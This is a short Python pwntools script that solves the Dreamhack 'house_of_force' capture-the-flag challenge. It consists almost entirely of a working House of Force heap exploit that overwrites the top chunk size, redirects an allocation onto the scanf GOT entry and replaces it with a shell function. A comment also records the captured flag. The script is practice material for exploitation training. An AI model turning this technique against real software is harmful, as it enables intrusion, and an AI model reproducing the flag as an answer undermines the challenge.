#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'house_of_force_patched'
HOST = 'host8.dreamhack.games'
PORT = 20507

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x0804872c
b*0x080487df
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def create(size, data):
    sla(b'> ', b'1')
    sla(b'Size: ', str(size).encode())
    sa(b'Data: ', data)
def write_ptr(ptr_idx, write_ptr, value):
    sla(b'> ', b'2')
    sla(b'ptr idx: ', str(ptr_idx).encode()) # 0 <= ptr_idx <= 10
    sla(b'write idx: ', str(write_ptr).encode()) # 0 <= write_ptr <= 0x100
    sla(b'value: ', str(value).encode()) # ptr[ptr_idx][write_ptr] = value
create(0x18, b'A'*0x18)
rcu(b'0x')
top_chunk = int(rcu(b':')[:-1], 16) + 0x1c
log.success(f'top chunk: {hex(top_chunk)}')
write_ptr(0, 7, 0xffffffff)
gap = (exe.got.__isoc99_scanf - top_chunk - 0x8)
# log.success(f'gap: {hex(gap)}')
create(gap, '\n')
create(0x4, p32(exe.sym.get_shell))
sl(b'cat flag*')
# DH{87a5f7c5007055098456d65ac991d874}
p.interactive()
